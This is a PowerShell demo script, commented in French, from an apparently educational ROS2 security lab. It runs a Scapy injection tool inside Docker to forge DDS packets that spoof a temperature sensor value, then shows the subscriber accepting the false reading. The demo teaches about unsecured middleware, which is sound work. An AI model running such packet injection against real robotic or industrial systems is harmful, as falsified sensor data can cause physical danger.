# demo2_injection.ps1 -- Scene video 2 : usurpation de capteur (Scapy, Partie A etape 5)
# Prerequis : lab en mode NON securise (demo1). Duree ~45 s.
$ErrorActionPreference = 'SilentlyContinue'
function Narr($t){ Write-Host "`n>>> $t`n" -ForegroundColor Cyan; Start-Sleep 2 }
Set-Location "$PSScriptRoot\..\ros2_lab"
$BR = "br-" + (docker network inspect -f '{{.Id}}' ros2_lab).Substring(0,12)
$scripts = (Resolve-Path "..\scripts").Path

Narr "Flux NORMAL recu par le subscriber (temperature ~24 C) :"
docker restart ros2_publisher | Out-Null; Start-Sleep 6
docker logs --tail 6 ros2_subscriber | Select-String sensor_data

Narr "L'attaquant forge des paquets DDS avec une FAUSSE valeur (99.9) et les injecte :"
docker run --rm --net=host --cap-add NET_ADMIN --cap-add NET_RAW -v "${scripts}:/s" ros2-lab:humble `
  python3 -I /s/inject_dds.py --iface $BR --count 8 --sn-bump 80
Start-Sleep 1

Narr "Resultat : le subscriber accepte et affiche la FAUSSE mesure (99.9 / 6666.6) :"
docker logs --tail 12 ros2_subscriber | Select-String sensor_data | Select-Object -Last 10
Narr "Spoofing reussi : une fausse donnee capteur = mauvaise decision = danger physique."
